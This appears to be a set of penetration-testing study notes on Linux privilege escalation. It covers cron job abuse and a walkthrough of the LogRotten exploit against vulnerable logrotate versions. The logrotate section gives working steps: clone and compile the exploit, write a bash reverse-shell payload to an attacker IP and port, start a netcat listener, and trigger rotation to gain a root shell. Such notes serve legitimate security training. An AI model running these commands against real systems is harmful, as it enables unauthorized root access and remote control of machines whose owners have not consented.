# Programs, Jobs and Services

## **CronJob Abuse**

> Scheduled jobs, typically used for administrative tasks, creating backups, cleaning directories etc
>
> The `crontab` command can create a cron file, which will be run by the cron daemon on the schedule specified
>
> When created, the cron file will be created in /var/spool/cron for the specific user that creates it
>
> Each entry in the crontab file requires six items in the following order: `minutes, hours, days, months, weeks, commands`.

**Exploiting Cronjobs:**

* By using `pspy` we can view running processes and commands run by others users without the need for root privileges
* CronJobs can be abused by analyzing their behaviour and the files they interact with
* Suppose a cronjob runs a backup script as root periodically.
* If we can interact with any resources handled by the script (or the script itself) we may be able to edit the logic of such script in order to get a reverse shell as the user running such cronjob (root)

***

## **Logrotate Abuse**

> `logrotate` is a tool (typically ran as a `cronjob`) used to manage all logs in `/var/logs`
>
> Its global settings configuration file is located at `/etc/logrotate.conf`, the `/etc/logrotate.d/` instead contains the configuration files for all forced rotations (after the first one)

**Exploiting logrotate with LogRotten:**

* **Prerequisites:** logrotate must run as `root` and we need `write permissions` on the logrotate log files
* **Vulnerable versions:** `3.8.6` `3.11.0` `3.15.0` `3.18.0`
* **Exploitation steps:**
  1. Use `pspy` to verify that a `cronjob` running `logrotate` as `root` is ran periodically
  2. Identify the logfile being rotated periodically: such files typically have a filename format like `filename.log.1` for the first rotation, then `filename.log.2` and so on
  3. `git clone https://github.com/whotwagner/logrotten.git`
  4. `gcc logrotten.c -o logrotten`
  5. `echo 'bash -i >& /dev/tcp/your-ip/nc-port 0>&1' > payload`
  6. Start the netcat listener on the attacker machine: nc -lvnp 9001
  7. Determine the option used by logrotate (create or compress): `grep "create\|compress" /etc/logrotate.conf | grep -v "#"`
  8. Adapt the payload based on the option specified in the `logrotate.conf` file:
     * Create: `./logrotten -p ./payload /tmp/log/pwnme.log`
     * Compress: `./logrotten -p ./payload -c -s 4 /tmp/log/pwnme.log`
  9. Wait for the rotation and get the reverse shell as root
  10. _**Disclaimer:**_ sometimes you might need to edit the logfile (add a blank space) in order to trigger the rotation
